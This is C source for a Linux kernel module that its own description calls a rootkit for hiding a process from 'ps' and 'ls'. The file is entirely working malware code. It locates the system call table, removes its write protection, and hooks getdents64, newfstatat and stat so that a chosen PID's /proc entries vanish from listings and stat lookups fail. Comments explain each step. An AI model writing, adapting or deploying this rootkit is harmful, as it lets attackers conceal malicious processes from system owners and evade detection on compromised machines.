#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>



#define MAX_PATH 100


MODULE_LICENSE("GPL"); //GNU General Public License version
MODULE_AUTHOR("eyal shain");
MODULE_DESCRIPTION("A Rootkit for hiding a process from 'ps' and 'ls' commands");
MODULE_VERSION("2.0");


// parameters of the module
unsigned long kallsyms_lookup_addr;
char *hiding_pid;

module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup_name(char *path) function address");
module_param(hiding_pid, charp, S_IRUGO);
MODULE_PARM_DESC(hiding_pid, "the process to hide the pid");




//since there is no definition of the struct linux_dirent, we'll write it:
// The dirent structure describes an entry in a directory.(file of a sub-directory)
struct linux_dirent {

    unsigned long d_ino;     // inode(index node) number
    unsigned long d_off;     // off-set to the next linux dirent
    unsigned short d_reclen;  //length of this linux dirent
    char          d_name[];  // file name (null terminated)

};


// here, we'll define the pointers to the functions kallsyms_lookup_name, syscall_table, and old stat and old getdents handlers:                                             
unsigned long (*kallsyms_lookup_name)(const char *name);
unsigned long *sys_call_table;

//struct pt_regs store all the registers, so we can access them.
asmlinkage int (*old_newfstatat)(const struct pt_regs *regs);
asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
char proc_path[MAX_PATH];


int set_addr_rw(unsigned long _addr);
int set_addr_ro(unsigned long _addr);
void init_buffer(void);
asmlinkage int new_getdents64(const struct pt_regs *regs);
asmlinkage int new_newfstatat(const struct pt_regs *regs);


int set_addr_rw(unsigned long _addr)
{
    unsigned int level;
    pte_t *pte; // pointer to a page table entry

    // here, we are putting into pte the pte (which contain thinks like the physical address, permissions and more) corresponding to the _addr
    pte = lookup_address(_addr, &level); 

    if(pte -> pte & ~_PAGE_RW){  
        pte -> pte |= _PAGE_RW;
    }

    return 0;

}

int set_addr_ro(unsigned long _addr)
{
    unsigned int level;
    pte_t *pte;

    pte = lookup_address(_addr, &level);
    pte -> pte = pte -> pte &~ _PAGE_RW;
    
    return 0;

}


//sets the buffer to the '/proc/hiding_pid'
void init_buffer(void)
{
    strcpy(proc_path, "/proc/");
    strcpy(proc_path + strlen("/proc/"), hiding_pid);
}



// regs -> rdi  =  -
// regs -> rsi  =  const char *filename
// regs -> rdx  =  -

asmlinkage int new_newfstatat(const struct pt_regs *regs) {

    printk(KERN_INFO "newfstatat has been call\n");

	char *path = (char*) regs->si;
	
       // perform our malicious code here- the HOOK!
       if (strstr(path, proc_path) != NULL || strstr(proc_path, path) != NULL) {            
	       
	       // inside the call to our hidden process, return error
	       return -1;
    	}

        // executing the original stat handler
        return (*old_newfstatat)(regs);
}




// regs -> rdi  =  int fd(file descriptor)
// regs -> rsi  =  struct linux_dirent *dirent 
// regs -> rdx  =  unsigned int count	
asmlinkage int new_getdents64(const struct pt_regs *regs)
{
    int ret;

    struct linux_dirent *curr = (struct linux_dirent*)regs->si;

    int i = 0;

    ret = (*old_getdents64)(regs);
    

    // going through the entires, looking of out pid
    while (i < ret)
    {

        //checking if it is out process
        if (!strcmp(curr->d_name, hiding_pid))
        {
                int reclen = curr->d_reclen;
                char *next = (char*)curr + reclen; // points to the next directory entry.
                int len = (int)regs->si + ret - (uintptr_t)next; // calculates the length of the remaining entries after the current directory.
                memmove(curr, next, len); // removing the current entry by shifting the remaining entries to the current memory location 
                ret -= reclen; // subtract to current length from the total length(in bytes)
                continue; // skiping, no need to advance to the next entry.
        }

        // moving to the next entry.
        i += curr->d_reclen;
        curr = (struct linux_dirent*)((char*)regs->si + i);

        


    }
        return ret;

}


static int __init rootkit_init(void)
{

    printk(KERN_INFO "Initializing rootkit\n");
    init_buffer();

    //initilizing kallsyms_lookup_name and hiding_pid pointers with their addresses.
    kallsyms_lookup_name = (void*)(kallsyms_lookup_addr);
    hiding_pid = hiding_pid;

    //getting sys_call_table address from kallsyms_lookup_name
    sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    

    if (!sys_call_table) {
        printk(KERN_ERR "Couldn't find sys_call_table\n");
        return -1;
    }


    printk(KERN_INFO "sys_call_table found at %px\n", sys_call_table);

    // sys_call_table is read only, let's change that
    set_addr_rw((unsigned long)sys_call_table);

    // saving the old stat and getdents handlers
    old_newfstatat = (void*)(sys_call_table[__NR_newfstatat]);
    old_getdents64 = (void*)(sys_call_table[__NR_getdents64]);

    sys_call_table[__NR_newfstatat] = (unsigned long)(new_newfstatat);
    sys_call_table[__NR_stat] = (unsigned long)(new_newfstatat);
    sys_call_table[__NR_getdents64] = (unsigned long)(new_getdents64);

    set_addr_ro((unsigned long)sys_call_table);


    printk(KERN_INFO "Rootkit initialized\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    set_addr_rw((unsigned long)sys_call_table);

    sys_call_table[__NR_newfstatat] = (unsigned long)(old_newfstatat);
    sys_call_table[__NR_getdents64] = (unsigned long)(old_getdents64);

    set_addr_ro((unsigned long)sys_call_table);

    printk(KERN_INFO "Rootkit removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
